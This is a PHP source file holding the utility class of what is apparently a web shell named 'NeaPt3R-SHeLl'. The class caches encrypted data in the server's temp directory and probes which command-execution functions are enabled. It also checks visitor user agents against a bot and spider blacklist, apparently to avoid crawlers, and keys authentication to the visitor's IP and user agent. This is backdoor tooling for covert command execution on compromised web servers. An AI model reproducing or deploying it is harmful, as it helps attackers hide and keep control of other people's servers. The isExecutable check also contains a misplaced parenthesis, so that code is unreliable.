<?php

class Utils
{
    /**
     * Get temporary directory path
     *
     * @return string
     */
    public function getTmpDir()
    {
        $aTmpDirs = array(
            @ $_ENV['TMP'],
            ini_get('session.save_path'),
            ini_get('upload_tmp_dir'),
            ini_get('soap.wsdl_cache_dir'),
            sys_get_temp_dir(),
            '/tmp'
        );

        $aTmpDirs = array_unique($aTmpDirs);

        foreach ($aTmpDirs as $sTmpDir) {
            if (is_readable($sTmpDir) && is_writable($sTmpDir)) {
                return $sTmpDir;
            }
        }

        return null;
    }

    /**
     * Simple XOR encryption
     *
     * @param  string $sData Message
     * @param  string $sKey  [Optional] Use key
     * @return string        encrypted string
     */
    public function encrypt($sData, $sKey = NULL)
    {
        /**
         * Domyslny klucz
         */
        if ($sKey === NULL) {
            $sKey = $this->getUniqueKey();
        }

        /**
         * Musza wystepowac jakies dane
         */
        if (($iDataLen = strlen($sData)) === 0) {
            return NULL;
        }

        $iKeyLen = strlen($sKey);

        $sNewData = NULL;

        /**
         * Szyfrowanie
         */
        for ($i = 0; $i < $iDataLen; ++$i) {
            $sNewData .= chr(ord(substr($sData, $i, 1)) ^ ord(substr($sKey, $i % $iKeyLen, 1)));
        }

        return $sNewData;
    }

    /**
     * XOR Decryption
     *
     * @param  string $sData Message
     * @param  string $sKey  [Optional] Use key
     * @return string        decrypted string
     */
    public function decrypt($sData, $sKey = NULL)
    {
        return $this->encrypt($sData, $sKey);
    }

    public function getPort($iPort)
    {
        if (!ctype_digit((string) $iPort)) {
            return 0;
        }

        $iPort = (int) $iPort;

        if ($iPort < 0 || $iPort > 65535) {
            return 0;
        }

        return $iPort;
    }

    public function getHostPort($sHost)
    {
        $sHost = trim($sHost);

        if (strpos($sHost, ':') === false) {
            return array();
        }

        list($sHost, $iPort) = explode(':', $sHost);

        if (0 === $iPort = $this->getPort($iPort)) {
            return array();
        }


        return array($sHost, $iPort);
    }

    public function isWindows()
    {
        return (strncmp(PHP_OS, 'WIN', 3) === 0);
    }

    public function isSafeMode()
    {
        return (bool) ini_get('safe_mode');
    }

    public function isExecutable()
    {
        if ($this->isSafeMode()) {
            return false;
        }

        return count(array_diff($this->getSystemFunctions(), $this->getDisabledFunctions()) > 0);
    }

    public function getDisabledFunctions()
    {
        $aDisableFunctions = array();

        if (($sDisableFunctions = ini_get('disable_functions')) !== '') {
            $aDisableFunctions = explode(',', $sDisableFunctions);

            $aDisableFunctions = array_map(create_function('$sValue', 'return strtolower(trim($sValue));'), $aDisableFunctions);
        }

        return $aDisableFunctions;
    }

    public function getSystemFunctions()
    {
        $aSystemFunctions = array(
            'exec',
            'shell_exec',
            'passthru',
            'system',
            'popen',
            'proc_open'
        );

        if (function_exists('pcntl_exec')) {
            $aSystemFunctions[] = 'pcntl_exec';
        }

        return $aSystemFunctions;
    }

    public function isUserAgentOnBlacklist($sUserAgent)
    {
        static $aUserAgents = array(
            'bot',
            'yahoo',
            'spider'
        );

        foreach ($aUserAgents as $sUA) {
            if (stripos($sUserAgent, $sUA) !== false) {
                return true;
            }
        }

        return false;
    }

    /**
     * Get all commands assigned to module (class name)
     *
     * @param  string $sModule Module name (Class name)
     * @return array           List of commands
     */
    public function getCommandsByModule($sModule)
    {
        $aCommands = array();

        foreach ($this->getCommands() as $sCmd => $sClass) {
            if ($sClass === $sModule) {
                $aCommands[] = $sCmd;
            }
        }

        return $aCommands;
    }

    /**
     * Get list of all commands
     *
     * @example array(
     *     'mv' => ModuleMv
     *     'move' => ModuleMv
     * )
     * @return array
     */
    public function getCommands()
    {
        static $aModules;

        if ($aModules === NULL) {
            $aModules = array();

            $aClasses = get_declared_classes();

            foreach ($aClasses as $sClass) {
                if ((strncmp($sClass, 'Module', 6) === 0) && ($sClass !== 'ModuleDummy') && ($sClass !== 'ModuleAbstract')) {
                    /**
                     * @todo, Reflection class since PHP 5.3, I should find
                     * another way to use PHP 5.2.X
                     */
                    $oReflection = new ReflectionClass($sClass);

                    if ($oReflection->isSubclassOf('ModuleAbstract')) {
                        $aCommands = $sClass::getCommands();

                        foreach ($aCommands as $sCommand) {
                            $aModules[$sCommand] = $sClass;
                        }
                    }
                }
            }
        }

        return $aModules;
    }

    /**
     * Get all modules (Classes names)
     *
     * @return array
     */
    public function getModules()
    {
        return array_unique(array_values($this->getCommands()));
    }

    /**
     * Unique key to encrypt data
     *
     * @return string
     */
    public function getUniqueKey()
    {
        return sha1(Request::getServer('PATH'), true);
    }

    public function getUniquePrefix()
    {
        return substr(sha1(Request::getServer('PATH')), 0, 10) . '_';
    }

    /**
     * Location of temporary file
     *
     * @return string
     */
    public function cacheGetFile($sKey)
    {
        return $this->getTmpDir() . '/' . $this->getUniquePrefix() . md5($sKey);
    }

    public function cacheGet($sKey)
    {
        $sFile = $this->cacheGetFile($sKey);

        if (is_file($sFile) && is_readable($sFile)
            && (($sData = file_get_contents($sFile)) !== false)
        ) {
            $sData = $this->decrypt($sData);

            if (substr($sData, 0, 14) === 'NeaPt3R-SHeLl_') {
                return unserialize(substr($sData, 14));
            }
        }

        return false;
    }

    public function cacheSet($sKey, $mValue)
    {
        $sFile = $this->cacheGetFile($sKey);

        $sValue = 'NeaPt3R-SHeLl_' . serialize($mValue);

        @ file_put_contents($sFile, $this->encrypt($sValue));
    }

    public function getAuthFileKey()
    {
        return md5(Request::getServer('REMOTE_ADDR') . Request::getServer('USER_AGENT')) . '_auth';
    }

}
